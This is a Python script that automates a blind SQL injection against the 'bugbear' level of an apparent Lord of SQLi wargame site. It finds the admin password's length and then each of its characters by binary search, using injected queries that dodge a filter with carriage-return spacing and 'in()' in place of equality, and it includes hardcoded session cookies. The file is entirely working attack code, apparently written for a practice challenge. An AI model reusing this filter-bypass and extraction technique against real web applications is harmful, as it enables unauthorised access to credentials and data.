import requests
import time


def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?pw=1&no=1%0d||%0did%0din%0d(\"admin\")%26%26length(pw)<"+str(length)
		result=requests.get(query_add, cookies=cookie)
		#print(esult.text.find("Hello"))
		if(result.text.find("Hello")<2500):
			print("Length is : "+str(length-1))
			return length-1


def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add=query+"?pw=1&no=1%0d||%0did%0din%0d(\"admin\")%26%26right(left(pw,"+str(index)+"),1)>char("+str(mid)+")"
		result=requests.get(query_add, cookies=cookie)
		#print(first, last, result.text.find("Hello"))
		if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
			first=mid+1
			if(last==first+1):
				query_add=query+"?pw=1&no=1%0d||%0did%0din%0d(\"admin\")%26%26right(left(pw,"+str(index)+"),1)>char("+str(first)+")"
				result=requests.get(query_add, cookies=cookie)
				if(result.text.find("Hello")<=2500 and result.text.find("Hello")>0):
					return last
				else:
					return first
		else:
			last=mid

	return first


if(__name__=="__main__"):
	
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"htdff840qhcmls15saskb21up7"}
	query='https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php'
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)), end="")
	